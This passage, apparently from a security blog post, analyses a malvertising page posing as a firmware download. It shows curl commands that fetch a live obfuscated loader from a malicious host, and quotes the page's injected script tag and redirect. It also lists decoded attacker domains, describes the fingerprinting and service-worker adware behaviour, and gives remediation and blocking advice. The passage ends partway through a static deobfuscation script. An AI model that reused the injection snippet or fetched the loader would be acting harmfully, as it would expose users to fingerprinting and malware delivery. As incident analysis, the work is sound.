+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -I</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -L</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;https://gofirmware.com/downloads/pxie-8880-firmware&quot;</span></span>
+<span data-line> </span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Downloading the external loader referenced in the page (protocol-relative -> https)</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -sS</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mw.min.js</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;https://hoksomuptak.net/0c5/9cac6/mw.min.js?z=8643282&amp;sw=/sw-check-permissions-80925.js&quot;</span></span>
+<span data-line> </span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Inspecting the start of the downloaded loader (safe, static)</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">head</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -n</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 200</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mw.min.js</span></span>
+<span data-line> </span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Static decoding </span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">node</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> deobfuscate.js</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">node</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> reconstruct_urls.js</span></span></code></pre></figure>
+<p>(You can find the Node scripts I used earlier — they parse the mapping object inside <code>mw.min.js</code>, apply the Caesar-style decode seen in the obfuscated code, and produce decoded key/value pairs and reconstructed URLs. Those scripts only decode strings and never <code>eval</code> or run remote fetches.)</p>
+<h2 id="4--what-the-initial-html-contained-static-observation">4 — What the initial HTML contained (static observation)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4--what-the-initial-html-contained-static-observation" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>From <code>gofirmware_page.html</code> (<code>loading-page</code>):</p>
+<ul>
+<li>
+<p>A <strong>meta refresh</strong>:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="html" data-theme="github-light github-dark"><code data-language="html" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">meta</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> http-equiv</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;refresh&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> content</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;5;url=https://ak.inazumarillom.com/4/8643286?var=mfa&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
+<p>→ Redirects client after 5 seconds.</p>
+</li>
+<li>
+<p>An <strong>inline script</strong> that:</p>
+<ul>
+<li>
+<p>Contains obfuscated code that reconstructs a query string using <code>navigator.userAgentData</code> (if present).</p>
+</li>
+<li>
+<p>Builds a URL and executes <code>window.location.replace(...)</code> with those appended parameters.</p>
+</li>
+<li>
+<p>Injects an external script via:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="js" data-theme="github-light github-dark"><code data-language="js" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">s.src</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'//hoksomuptak.net/0c5/9cac6/mw.min.js?z=8643282'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '&amp;sw=/sw-check-permissions-80925.js'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document.head.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">appendChild</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(s);</span></span></code></pre></figure>
+</li>
+<li>
+<p>Yandex Metrika analytics snippet (tracking) was present.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Interpretation:</strong> the page tries to ensure a redirect occurs (meta refresh + JS). The JS collects browser fingerprint info and loads an external, obfuscated loader. The external loader (mw.min.js) is the real workhorse.</p>
+<h2 id="5--external-loader-mwminjs--static-analysis--decoding">5 — External loader (<code>mw.min.js</code>) — static analysis &amp; decoding<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5--external-loader-mwminjs--static-analysis--decoding" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>I downloaded <code>mw.min.js</code> and performed static decoding of the mapping object found inside the obfuscated code.</p>
+<h3 id="how-the-loader-was-obfuscated">How the loader was obfuscated<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#how-the-loader-was-obfuscated" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>
+<p>The file contains a big mapping object with strings obfuscated by a simple per-letter rotation (a Caesar-like shift ±12) and dynamic getters.</p>
+</li>
+<li>
+<p>The loader computes many values via <code>Object.defineProperty</code> getters and only decodes strings on demand.</p>
+</li>
+</ul>
+<h3 id="what-i-decoded-representative-highlights">What I decoded (representative highlights)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#what-i-decoded-representative-highlights" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>
+<p><strong>Decoded domains referenced by the loader:</strong></p>
+<ul>
+<li>
+<p><code>https://zdzhk.com</code></p>
+</li>
+<li>
+<p><code>https://kbvcd.com</code></p>
+</li>
+<li>
+<p><code>https://my.rtmark.net</code></p>
+</li>
+<li>
+<p><code>https://dulotadtor.com</code></p>
+</li>
+<li>
+<p><code>https://abunownon.com</code></p>
+</li>
+<li>
+<p><code>https://dawac.com</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Decoded resource paths:</strong></p>
+<ul>
+<li>
+<p><code>/contents/s/a7/7e/0e/.../01027922412471.png</code></p>
+</li>
+<li>
+<p><code>/contents/s/a7/7e/0e/.../01027922412470.png</code></p>
+</li>
+<li>
+<p><code>/4/</code> (short directory used in routing)</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Decoded behavior keys (indicative strings):</strong></p>
+<ul>
+<li><code>forcePopup</code>, <code>swDefaultBanner</code>, <code>Personal Offer for You.</code>, <code>swPingDomain</code>, <code>swRunCmdCache</code>, <code>autoInstall</code>, <code>getOptionsFromUrl</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Loader logic (static reconstruction):</strong></p>
+<ul>
+<li>
+<p>The loader constructs fetch URLs by combining a base domain + path tokens, fetches those resources, creates DOM nodes, sets attributes (CORS, crossorigin, dataset), and injects downloaded content into the page (<code>createElement</code>, <code>appendChild</code>, <code>createTextNode</code>).</p>
+</li>
+<li>
+<p>The loader has fallback logic: if a fetch fails, it constructs alternative URLs (including a server-side host + path combination) and retries.</p>
+</li>
+<li>
+<p>Many reconstructed URLs point to <code>.png</code> resources; the loader may treat these as images, tracking pixels, decoy content, or containers for encoded payloads.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Interpretation:</strong> <code>mw.min.js</code> is a loader that fingerprints the client and pulls staged resources from a set of obscure domains. It injects content into the page, can force popups or banners, and contains service-worker related config keys — all consistent with malvertising/service-worker adware patterns.</p>
+<h2 id="6--server-side-logic-and-platform-dependent-behavior">6 — Server-side logic and platform-dependent behavior<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6--server-side-logic-and-platform-dependent-behavior" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>
+<p>The HTML’s meta refresh target was <code>https://ak.inazumarillom.com/4/8643286?var=mfa</code>.</p>
+</li>
+<li>
+<p>The inline JS also appended fingerprints and used <code>window.location.replace(...)</code> to move the user to a URL that includes those fingerprints.</p>
+</li>
+<li>
+<p>From logs, colleagues, and the loader’s fallback logic, I concluded <strong>some routing decisions happen on the server side</strong> (host: <code>ak.inazumarillom.com</code>). That means:</p>
+<ul>
+<li>
+<p>The server at <code>ak.inazumarillom.com</code> can examine incoming request headers, IP address, referrer, and any fingerprint query parameters and return different content (benign ad, aggressive popup, link to malware) depending on those signals.</p>
+</li>
+<li>
+<p>Consequently, two different visitors (or the same visitor from two different devices) may see different destinations or payloads.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Why that matters:</strong> server-side routing makes detection and reproduction harder — static analysis will only reveal the loader and how it contacts the server; the server can vary behavior and only serve the malicious payload under certain conditions (geo, IP range, referrer, UA, cookie presence, or a fingerprint threshold).</p>
+<h2 id="7--fingerprinting-details-what-the-js-collected-and-how-it-was-used">7 — Fingerprinting details (what the JS collected and how it was used)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#7--fingerprinting-details-what-the-js-collected-and-how-it-was-used" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>The loader used the modern browser API <code>navigator.userAgentData</code> and its <code>getHighEntropyValues()</code> call (where available) to get high-entropy fields. Specifically:</p>
+<ul>
+<li>
+<p><strong>Fields fetched (when supported):</strong></p>
+<ul>
+<li>
+<p><code>mobile</code> (is the device mobile)</p>
+</li>
+<li>
+<p><code>model</code> (device model)</p>
+</li>
+<li>
+<p><code>platform</code> (OS family)</p>
+</li>
+<li>
+<p><code>platformVersion</code> (OS version)</p>
+</li>
+<li>
+<p><code>uaFullVersion</code> (browser full version)</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>How these values were used:</strong></p>
+<ul>
+<li>
+<p>Constructed a query string like <code>?is_mobile=true&amp;android_model=&lt;encoded>&amp;os=&lt;encoded>&amp;os_version=&lt;encoded>&amp;browser_version=&lt;encoded></code></p>
+</li>
+<li>
+<p>Appended to redirect/fetch URLs and sent to the server. That enriched fingerprint allowed the server-side logic to:</p>
+<ul>
+<li>
+<p>target specific device types (mobile vs desktop),</p>
+</li>
+<li>
+<p>select specific offers or payloads,</p>
+</li>
+<li>
+<p>evade generic sandboxing by only serving malicious content to specific environments.</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Note on privacy:</strong> <code>navigator.userAgentData.getHighEntropyValues()</code> supplies more granular information than the classic <code>navigator.userAgent</code> string; attackers use it to fingerprint more reliably.</p>
+<h2 id="8--reconstructed-url-patterns-and-what-they-imply">8 — Reconstructed URL patterns and what they imply<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#8--reconstructed-url-patterns-and-what-they-imply" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>
+<p>I reconstructed ~72 URL combinations by combining decoded base domains with the <code>/contents/.../*.png</code> paths and <code>/4/</code> endpoints. Examples:</p>
+<ul>
+<li>
+<p><code>https://zdzhk.com/contents/.../01027922412471.png</code></p>
+</li>
+<li>
+<p><code>https://kbvcd.com/4/</code></p>
+</li>
+<li>
+<p><code>https://my.rtmark.net/contents/.../01027922412470.png</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Interpretation of patterns:</strong></p>
+<ul>
+<li>
+<p><code>.png</code> targets often used as tracking pixels or stealth containers for encoded data. Attackers can store JS or data in what looks like image resources and decode them client-side.</p>
+</li>
+<li>
+<p>The <code>/4/</code> endpoints look like campaign/redirect endpoints that may return different HTML/JS depending on server-side decision logic.</p>
+</li>
+<li>
+<p>The presence of multiple domains provides redundancy and evasion — if one domain is blocked, another can be used.</p>
+</li>
+</ul>
+<h2 id="9--evidence-of-adwareservice-worker-strategies">9 — Evidence of adware/service-worker strategies<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#9--evidence-of-adwareservice-worker-strategies" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>
+<p>Many decoded keys referenced service-worker concepts and persistent banner/popup logic (<code>sw*</code> keys, <code>autoInstall</code>, <code>forcePopup</code>, <code>assign</code>, <code>defaultBannerDomain</code>).</p>
+</li>
+<li>
+<p>This indicates the loader either:</p>
+<ul>
+<li>
+<p>uses service-workers to persist or cache behavior across sessions (service-worker adware), or</p>
+</li>
+<li>
+<p>registers scripts that make investigation harder (background network calls and event-driven behavior).</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Takeaway:</strong> even if no binary is installed, the browser environment can be abused to present persistent ads, notifications, or re-run redirect behavior until the service-worker or cached entries are removed.</p>
+<h2 id="10--impact-assessment-if-you-clicked-the-link">10 — Impact assessment (if you clicked the link)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#10--impact-assessment-if-you-clicked-the-link" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>
+<p><strong>If you only clicked and did not interact further:</strong></p>
+<ul>
+<li>Most likely outcomes: your IP, referrer, and detailed browser fingerprint were collected. You may have seen aggressive popups/ads. No evidence from static analysis that simply visiting automatically executed a binary on your OS. That said, there is logic present to analyze what platform you are on, and server logic based on that information. Given that information it is completely possible that if you are on a specific platform that they are wanting to target then you would get a malicious payload automatically downloaded (and ran if they were using a browser exploit). I’m not going to test it on a bunch of different platforms so I’m just giving the general advice <strong>to be safe</strong>.</li>
+</ul>
+</li>
+<li>
+<p><strong>If you interacted with prompts, accepted notifications, or downloaded and ran a file:</strong></p>
+<ul>
+<li>Risk escalates — you may have installed adware, an unwanted extension, or in a worst case, a further payload.</li>
+</ul>
+</li>
+<li>
+<p><strong>Potential persistent artifacts in the browser:</strong></p>
+<ul>
+<li>
+<p>Registered service-worker(s).</p>
+</li>
+<li>
+<p>Push notification subscriptions.</p>
+</li>
+<li>
+<p>LocalStorage / IndexedDB entries used by the loader.</p>
+</li>
+<li>
+<p>Cached banner assets or scripts.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="11--recommendations--remediation-steps">11 — Recommendations &amp; remediation steps<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#11--recommendations--remediation-steps" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="immediate-for-users">Immediate (for users)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#immediate-for-users" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ol>
+<li>
+<p><strong>If you clicked but didn’t interact further:</strong></p>
+<ul>
+<li>
+<p>Clear the site data in your browser for <code>gofirmware.com</code> and the domains seen (clear service-workers, site cookies, localStorage, and notifications).</p>
+</li>
+<li>
+<p>Steps (Chrome/Chromium): Settings → Privacy and security → Cookies and other site data → See all site data and permissions → search and remove entries for <code>gofirmware.com</code>, <code>hoksomuptak.net</code>, <code>zdzhk.com</code>, etc. Also check <code>chrome://serviceworker-internals/</code> or devtools Application → Service Workers.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>If you accepted any prompts or downloaded files:</strong></p>
+<ul>
+<li>Do not run downloaded files. Preserve copies and hashes. Investigate inside a VM or submit to VirusTotal / Hybrid Analysis. If you installed something, follow removal steps in a sandbox/VM first; if compromised, disconnect and escalate.</li>
+</ul>
+</li>
+</ol>
+<h3 id="technical--soc">Technical / SOC<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#technical--soc" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ol>
+<li>
+<p><strong>Block at DNS/firewall</strong>:</p>
+<ul>
+<li>
+<p>High priority: <code>zdzhk.com</code>, <code>kbvcd.com</code>, <code>dulotadtor.com</code>, <code>abunownon.com</code>.</p>
+</li>
+<li>
+<p>Medium: <code>my.rtmark.net</code>, <code>dawac.com</code>.</p>
+</li>
+<li>
+<p>Also block <code>hoksomuptak.net</code> and <code>ak.inazumarillom.com</code> (loader origin &amp; redirect controller).</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Preserve evidence</strong>: <code>curl_trace.txt</code>, <code>gofirmware_page.html</code>, <code>mw.min.js</code>, and outputs from the deobfuscation scripts.</p>
+</li>
+<li>
+<p><strong>Search logs</strong>: inspect web/proxy logs for requests to the domains above to identify other internal clients that may have visited these pages.</p>
+</li>
+<li>
+<p><strong>Endpoint checks</strong>: look for recent installs, new scheduled tasks, suspicious browser extensions, or service-worker registrations on user browsers.</p>
+</li>
+</ol>
+<h3 id="reporting--takedown">Reporting / takedown<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#reporting--takedown" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>
+<p>Consider reporting the malicious domains to:</p>
+<ul>
+<li>
+<p>Your internal threat intel/SOC team,</p>
+</li>
+<li>
+<p>DNS/ISP abuse contacts for the domains,</p>
+</li>
+<li>
+<p>Public services like abuse.ch or the hoster of the domains (from WHOIS/hosting lookup).</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Submit <code>mw.min.js</code> and the reconstructed URLs to VT / Hybrid Analysis for broader telemetry.</p>
+</li>
+</ul>
+<h2 id="12--appendix-a--key-artifacts-archived">12 — Appendix A — Key artifacts archived<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#12--appendix-a--key-artifacts-archived" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>
+<p><code>curl_trace.txt</code> — HTTP headers and redirection trace.</p>
+</li>
+<li>
+<p><code>gofirmware_page.html</code> (page source).</p>
+</li>
+<li>
+<p><code>loading-page</code> (local file copy of the HTML).</p>
+</li>
+<li>
+<p><code>mw.min.js</code> (downloaded loader).</p>
+</li>
+<li>
+<p>Node scripts used: <code>deobfuscate.js</code>, <code>reconstruct_urls.js</code> (safe static decoders).</p>
+</li>
+<li>
+<p>Outputs from Node scripts: the decoded mapping and the reconstructed URL list.</p>
+</li>
+</ul>
+<p><code>deobfuscate.js:</code></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="JavaScript" data-theme="github-light github-dark"><code data-language="JavaScript" data-theme="github-light github-dark" style="display:grid;"><span data-line><span>// deobfuscate.js</span></span>
+<span data-line> </span>
+<span data-line><span>// Static deobfuscator for mw.min.js mapping object</span></span>
+<span data-line> </span>
+<span data-line><span>// - Reads mw.min.js, finds Object.entries({...}) block</span></span>
+<span data-line> </span>
+<span data-line><span>// - Extracts simple key:'string' and key:number pairs (skips functions/complex values)</span></span>
+<span data-line> </span>
+<span data-line> </span>
+<span data-line><span>// - Prints decoded mapping, URL-like values, and tries to reconstruct fetch URL patterns</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const fs = require('fs');</span></span>
+<span data-line> </span>
+<span data-line><span>const path = require('path');</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const INFILE = path.join(__dirname, 'mw.min.js');</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>if (!fs.existsSync(INFILE)) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error(`ERROR: ${INFILE} not found. Put mw.min.js in same folder as this script.`);</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const raw = fs.readFileSync(INFILE, 'utf8');</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 1) Locate Object.entries({...}) block</span></span>
+<span data-line> </span>
+<span data-line><span>const startMarker = 'Object.entries(';</span></span>
+<span data-line> </span>
+<span data-line><span>let idx = raw.indexOf(startMarker);</span></span>
+<span data-line> </span>
+<span data-line><span>if (idx === -1) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: Could not find &quot;Object.entries(&quot; in mw.min.js');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>idx = raw.indexOf('{', idx + startMarker.length);</span></span>
+<span data-line> </span>
+<span data-line><span>if (idx === -1) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: Could not find &quot;{&quot; after Object.entries(');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// find matching closing brace for the top-level object (handles nested braces)</span></span>
+<span data-line> </span>
+<span data-line><span>let depth = 0;</span></span>
+<span data-line> </span>
+<span data-line><span>let endIdx = -1;</span></span>
+<span data-line> </span>
+<span data-line><span>for (let i = idx; i &lt; raw.length; i++) {</span></span>
+<span data-line> </span>
+<span data-line><span>const ch = raw[i];</span></span>
+<span data-line> </span>
+<span data-line><span>if (ch === '{') depth++;</span></span>
+<span data-line> </span>
+<span data-line><span>else if (ch === '}') {</span></span>
+<span data-line> </span>
+<span data-line><span>depth--;</span></span>
+<span data-line> </span>
+<span data-line><span>if (depth === 0) {</span></span>
+<span data-line> </span>
+<span data-line><span>endIdx = i;</span></span>
+<span data-line> </span>
+<span data-line><span>break;</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>if (endIdx === -1) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: Could not find end of mapping object');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const objText = raw.slice(idx, endIdx + 1);</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 2) Extract simple key:'string' and key:&quot;string&quot; and key:number pairs</span></span>
+<span data-line> </span>
+<span data-line><span>// We'll intentionally only capture primitive string/number assignments to avoid running code</span></span>
+<span data-line> </span>
+<span data-line><span>const kvRegexSingle = /(?:([&quot;']?)([A-Za-z0-9_$]+)\1)\s*:\s*'((?:\\'|[^'])*)'/g;</span></span>
+<span data-line> </span>
+<span data-line><span>const kvRegexDouble = /(?:([&quot;']?)([A-Za-z0-9_$]+)\1)\s*:\s*&quot;((?:\\&quot;|[^&quot;])*)&quot;/g;</span></span>
+<span data-line> </span>
+<span data-line><span>const kvRegexNum = /(?:([&quot;']?)([A-Za-z0-9_$]+)\1)\s*:\s*([0-9]+(?:\.[0-9]+)?)/g;</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const mapping = {};</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// single-quoted strings</span></span>
+<span data-line> </span>
+<span data-line><span>let m;</span></span>
+<span data-line> </span>
+<span data-line><span>while ((m = kvRegexSingle.exec(objText)) !== null) {</span></span>
+<span data-line> </span>
+<span data-line><span>const key = m[2];</span></span>
+<span data-line> </span>
+<span data-line><span>const rawVal = m[3].replace(/\\'/g, &quot;'&quot;); // unescape simple escaped single quotes</span></span>
+<span data-line> </span>
+<span data-line><span>mapping[key] = rawVal;</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>// double-quoted strings</span></span>
+<span data-line> </span>
+<span data-line><span>while ((m = kvRegexDouble.exec(objText)) !== null) {</span></span>
+<span data-line> </span>
+<span data-line><span>const key = m[2];</span></span>
+<span data-line> </span>
+<span data-line><span>const rawVal = m[3].replace(/\\&quot;/g, '&quot;');</span></span>
+<span data-line> </span>
+<span data-line><span>mapping[key] = rawVal;</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>// pretty numbers</span></span>
+<span data-line> </span>
+<span data-line><span>while ((m = kvRegexNum.exec(objText)) !== null) {</span></span>
+<span data-line> </span>
+<span data-line><span>const key = m[2];</span></span>
+<span data-line> </span>
